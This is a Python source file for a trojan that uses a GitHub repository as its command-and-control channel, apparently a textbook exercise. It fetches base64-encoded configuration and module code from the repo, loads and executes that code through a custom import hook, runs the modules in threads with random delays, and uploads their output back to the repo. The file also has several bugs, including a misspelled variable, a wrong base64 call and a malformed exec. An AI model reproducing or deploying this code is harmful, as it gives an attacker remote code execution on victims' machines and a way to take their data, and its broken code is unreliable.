import json
import base64
import sys
import time
import imp
import random
import threading
import Queue
import os

from github3 import login

tojan_id = "abc"

trojan_config = f'{trojan_id}.json'
data_path     = f'data/{tojan_id}/'
trojan_modules= []
configured    = False
task_queue    = Queue.Queue() 

def connect_to_github():
  gh = login(username="0xdia", password="")
  repo = gh.repository("0xdia", "chapter7")
  branch = repo.branch("master")

  return gh, repo, branch

def get_file_contents(filepath):
  gh, repo, branch = connect_to_github()
  tree = branch.commit.commit.tree.to_tree().recurse()

  for filename in tree.tree:
    if filepath in filename.path:
      print(f"[*] Found file {filepath}")
      blob = repo.blob(filename._json_data['sha'])
      return blob.content

  return None

def get_trojan_config():
  global configured
  config_json = get_file_contents(trojan_config)
  config      = json.loads(base64.b64decode(config_json))
  configured  = True

  for task in config:
    if task['module'] not in sys.modules:
      exec(f"import {task['module']}")

  return config

def store_module_result(data):
  gh, repo, branch = connect_to_github()
  remote_path = f"data/{trojan_id}/{random.randint(1000,100000)}"
  repo.create_file(remote_path, "Commit message", base64.b64encode(data))

  return 

class GitImporter:
  def __init__(self):
    self.current_module_code = ""

  def find_module(self, fullname, path=None):
    if configured:
      print(f"[*] Attempting to retrieve {fullname}")
      new_library = get_file_contents(f"modules/{fullname}")

      if new_library is not None:
        self.current_module_code = base64.b64.decode(new_library)
        return self

    return None

  def load_module(self, name):
    module = imp.new_module(name)
    exec(self.current_module_code in module.__dict__)
    sys.modules[name] = module

    return module

def module_runner(module):
  task_queue.put(1)
  result = sys.modules[module].run()
  task_queue.get()

  # store the result in our repo
  store_module_result(result)
  
  return

# main trojan loop
sys.meta_path = [GitImporter()]

while True:
  if task_queue.empty():
    config = get_trojan_config()

    for task in config:
      t = threading.Thread(target=module_runner, args=(task['module'],))
      t.start()
      time.sleep(random.randint(1, 10))

    time.sleep(random.randint(1000, 10000))



